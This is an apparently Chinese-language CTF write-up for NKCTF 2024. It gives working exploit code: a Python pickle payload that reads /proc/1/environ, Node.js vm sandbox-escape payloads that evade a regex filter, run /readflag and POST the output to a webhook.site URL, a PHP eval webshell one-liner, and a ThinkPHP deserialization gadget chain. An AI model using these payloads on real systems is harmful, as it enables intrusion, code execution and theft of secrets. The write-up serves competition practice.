---
title: NKCTF-2024wp
date: 2024-03-025 00:48:41
tags: ["2024"]
categories: ["challenge"]
---

## 

## **attack_tacooooo**

账号tacooooo@qq.com

密码tacooooo

```
import pickle

class Exploit(object):

    def __reduce__(self):
        code = """
import os

def find_flag_and_write(source_directory, destination_path, destination_file_name):

    with open("/proc/1/environ", 'r') as flag_file:
        flag_content = flag_file.read()

    destination_file_path = os.path.join(destination_path, destination_file_name)
    with open(destination_file_path, 'a') as destination_file:
        destination_file.write(flag_content)


find_flag_and_write('/', '../var/lib/pgadmin/storage/tacooooo_qq.com/', 'flag.txt')

"""
        # 使用纯 Python 代码来写入文件
        return (exec, (code,))



# 序列化 exploit 对象
with open('posix.pickle', 'wb') as f:
    pickle.dump(Exploit(), f)


```



## **全世界最简单的CTF**

source

```
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const fs = require("fs");
const path = require('path');
const vm = require("vm");
app.use(bodyParser.json())
	.set('views', path.join(__dirname, 'views'))
	.use(express.static(path.join(__dirname, '/public'))) app.get('/', function(req, res) {
		res.sendFile(__dirname + '/public/home.html');
	})
function waf(code) {
	let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g;
	if (code.match(pattern)) {
		throw new Error("what can I say? hacker out!!");
	}
}
app.post('/', function(req, res) {
	let code = req.body.code;
	let sandbox = Object.create(null);
	let context = vm.createContext(sandbox);
	try {
		waf(code) let result = vm.runInContext(code, context);
		console.log(result);
	} catch (e) {
		console.log(e.message);
		require('./hack');
	}
}) app.get('/secret', function(req, res) {
	if (process.__filename == null) {
		let content = fs.readFileSync(__filename, "utf-8");
		return res.send(content);
	} else {
		let content = fs.readFileSync(process.__filename, "utf-8");
		return res.send(content);
	}
}) app.listen(3000, () => {
	console.log("listen on 3000");
})
```



```
payload:
1、
throw new Proxy({}, {
    get: function() {
      const cc = arguments.callee.caller;
      const g = (cc.constructor.constructor(`return ${`${'proces'}s`}`))();
      const h = g.mainModule.require('fs').readFileSync('/proc/self/environ');
      const p = (cc.constructor.constructor('return fetch'))();
      return p("https://webhook.site/1dc4e877-3eb8-4642-a3ef-17fc03f43ffa", {method: "POST", body: JSON.stringify({data: `${h}`})});
    }
  })
  exec被ban然后执行不了命令，中括号我本地能过，但是环境上不行。fs模块读不到flag文件。
  
  2、
  过滤了中括号
  throw new Proxy({}, {
    get: function() {
      const cc = arguments.callee.caller;
      const gg = (cc.constructor.constructor(`return ${`${'proces'}s`}`))();
      const hh = gg.mainModule.require(`${'child_p'}rocess`);
      const ff = (cc.constructor.constructor(`s = 1+2`))();
      const p = (cc.constructor.constructor('return fetch'))();
      return p("https://webhook.site/1dc4e877-3eb8-4642-a3ef-17fc03f43ffa", {method: "POST", body: JSON.stringify({data: `${s}`})});
    }
})
两个思路：
再构造一个函数。-------------不知道为什么不行
可以写入js文件，使用fork执行然后fetch出来。--------------ok！

payload：
// 文件写入suceess
throw new Proxy({}, {
    get: function() {
      const cc = arguments.callee.caller;
      const gg = (cc.constructor.constructor(`return ${`${'proces'}s`}`))();
let content = `
        let cs = require('${`${'child_p'}rocess').exe`}cSync('/readflag').toString();
        ${`${'proces'}s`}.on("message",function(msg){
            fetch("https://webhook.site/1dc4e877-3eb8-4642-a3ef-17fc03f43ffa", {method: "POST", body: JSON.stringify({data: cs})});
        })
      `;
      const fs = gg.mainModule.require('fs').appendFileSync("./readflag1.js",content);
      const p = (cc.constructor.constructor('return fetch'))();
      return p("https://webhook.site/1dc4e877-3eb8-4642-a3ef-17fc03f43ffa", {method: "POST", body: JSON.stringify({data: `${fs}`})});
    }
})

//通信成功
throw new Proxy({}, {
    get: function() {
      const cc = arguments.callee.caller;
      const g = (cc.constructor.constructor(`return ${`${'proces'}s`}`))();
      const h = g.mainModule.require(`${'child_p'}rocess`).fork('./readflag1.js');
      h.send('hello');
      const p = (cc.constructor.constructor('return fetch'))();
      return p("https://webhook.site/1dc4e877-3eb8-4642-a3ef-17fc03f43ffa", {method: "POST", body: JSON.stringify({data: `${h}`})});
    }
})

{
  "data": "NKCTF{5e1d772e-8260-444d-ab4b-21c7b7603521}\n"
}

```

### ![img](/1.png)



## **my first cms** 

这是什么cms？直接安装最新版的应该没有问题了吧……

[GitHub - capture0x/CMSMadeSimple2: CMS Made Simple Version: 2.2.19 - SSTI](https://github.com/capture0x/CMSMadeSimple2)

admin Admin123

![img](/png)

## 用过就是熟悉

在db.sql找到日志，guest的密码

![image-20240325015219515](/image-20240325015219515.png)

登录成功

![image-20240325015408536](/image-20240325015408536-1711303060130-3.png)

回收站有个一句话木马，里面提示了shell路径/var/www/html/data/files/shell

```
<?php eval($_POST[0]); ?>
```

然后继续代码审计

这里明显的php反序列化，tp框架

![image-20240325003234029](/image-20240325003234029.png)

看thinkphp框架代码

![image-20240325002928083](/image-20240325002928083.png)

找反序列化链子

![image-20240325003008039](/image-20240325003008039.png)

找到Windows.php有个removeFiles函数

![image-20240325003110936](/image-20240325003110936.png)

继续

![image-20240325003448934](/image-20240325003448934.png)

明显的字符拼接，找__toString

![image-20240325003740680](/image-20240325003740680.png)

调用toArray

![image-20240325003816026](/image-20240325003816026.png)

这里可以触发__get-----不可访问的属性读数据

![image-20240325003913601](/image-20240325003913601.png)

只找到这一个,继续跟进，可以触发__call------不可访问的函数

![image-20240325015550464](/image-20240325015550464.png)

这里有文件包含

写exp：

```
<?php

namespace think\process\pipes;

use think\Process;
// __destruct
class Windows{
    public $files = [];
}

namespace think;

use ArrayAccess;
use ArrayIterator;
use Countable;
use IteratorAggregate;
use JsonSerializable;
// __toString
class Collection{
    public $items = [];
}

namespace think;
// __get
class View{
    public $data = [];
    public $engine;
}

namespace think;
// __call
class Config{

}

use think\process\pipes\Windows;
$a = new Windows();
$a -> files = array(new \think\Collection());
$a -> files[0] -> items = new \think\View();
$a -> files[0] -> items -> data['loginout'=>new \think\Config()];
$a -> files[0] -> items -> engine  = array('name' => '../../../../../var/www/html/data/files/shell');//绝对路径不行

echo urlencode(base64_encode(serialize($a)));

```

然后post发包，